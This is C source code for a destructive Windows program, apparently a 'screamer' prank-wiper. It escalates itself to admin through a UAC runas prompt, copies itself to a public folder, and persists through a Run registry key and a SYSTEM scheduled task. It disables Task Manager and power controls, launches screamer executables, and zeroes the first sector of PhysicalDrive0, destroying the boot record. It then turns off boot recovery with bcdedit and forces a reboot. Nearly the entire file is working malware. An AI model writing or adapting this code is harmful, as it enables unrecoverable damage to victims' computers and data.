#include <windows.h>
#include <stdio.h>

void install_keyboard_block(void);
void disable_taskmgr(void);
void block_power(void);

void launch_screamers(void) {
    const char *exes[] = {"screamer1.exe","screamer2.exe","screamer3.exe",
                          "screamer4.exe","screamer5.exe"};
    for (int i = 0; i < 5; i++) {
        STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        CreateProcessA(NULL, (LPSTR)exes[i], NULL, NULL, FALSE,
                       CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    }
}

int main(void) {
    Sleep(600000);

    BOOL admin = FALSE;
    PSID grp = NULL; SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &grp);
    CheckTokenMembership(NULL, grp, &admin);
    FreeSid(grp);
    if (!admin) {
        char path[MAX_PATH]; GetModuleFileNameA(NULL, path, MAX_PATH);
        ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOW);
        return 0;
    }

    char cur[MAX_PATH]; GetModuleFileNameA(NULL, cur, MAX_PATH);
    CopyFileA(cur, "C:\\Users\\Public\\screamer.exe", FALSE);

    HKEY k;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &k);
    RegSetValueExA(k, "Screamer", 0, REG_SZ,
        (BYTE*)"C:\\Users\\Public\\screamer.exe", 31);
    RegCloseKey(k);
    system("schtasks /create /tn Screamer /tr C:\\\\Users\\\\Public\\\\screamer.exe "
           "/sc onlogon /ru SYSTEM /f");

    disable_taskmgr();
    block_power();
    launch_screamers();

    HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w; char zero[512] = {0};
        WriteFile(h, zero, 512, &w, NULL);
        CloseHandle(h);
    }
    system("bcdedit /set {default} recoveryenabled No");
    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
    system("shutdown /r /f /t 10");

    install_keyboard_block();
    return 0;
}
